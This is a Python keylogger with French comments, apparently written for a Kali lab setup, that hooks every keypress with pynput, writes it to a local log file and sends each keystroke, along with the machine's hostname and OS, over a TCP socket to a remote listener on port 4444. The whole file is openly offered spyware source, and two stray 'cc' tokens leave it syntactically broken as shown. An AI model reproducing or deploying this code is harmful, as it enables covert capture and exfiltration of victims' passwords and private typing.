from pynput.keyboard import Listener
import socket
import json
import platform  # Pour récupérer des informations sur l'OS
import socket as s  # Pour récupérer le hostname
import os  # Pour gérer les fichiers

# Adresse et port du serveur (Kali)
SERVER_IP = "192.168.81.135"  # Remplace par l'adresse IP de ta machine Kali
SERVER_PORT = 4444

# Fichier pour sauvegarder les frappes
LOG_FILE = "keylogs.txt"

# Assure que le fichier existe (ou le crée)
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("=== Keylogger Logs ===\n\n")

# Fonction pour envoyer des données au serveur
def send_data(data):cc
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        # Préparer les données en format JSON
        payload = json.dumps(data)
        client_socket.send(payload.encode('utf-8'))
        client_socket.close()
    except Exception as e:
        print(f"Erreur lors de l'envoi : {e}")

# Fonction pour envoyer les informations sur la cible
def send_target_info():
    try:
        target_info = {
            "type": "target_info",
            "hostname": s.gethostname(),
            "os": platform.system() + " " + platform.release(),
        }
        send_data(target_info)
        print("Informations sur la cible envoyées.")
    except Exception as e:
        print(f"Erreur lors de l'envoi des informations sur la cible : {e}")

# Fonction pour capturer les frappes de clavier
def log_keystroke(key):
    key = str(key).replace("'", "")  # Nettoyer les caractères

    # Sauvegarder dans le fichier
    with open(LOG_FILE, "a") as f:
        f.write(f"{key}") cc

    # Préparer les données pour l'envoi au serveur
    keystroke_data = {
        "type": "keystroke",
        "data": key,
    }
    send_data(keystroke_data)

# Envoi des informations sur la cible
send_target_info()

# Lancer l'écouteur pour les frappes clavier
with Listener(on_press=log_keystroke) as listener:
    listener.join()
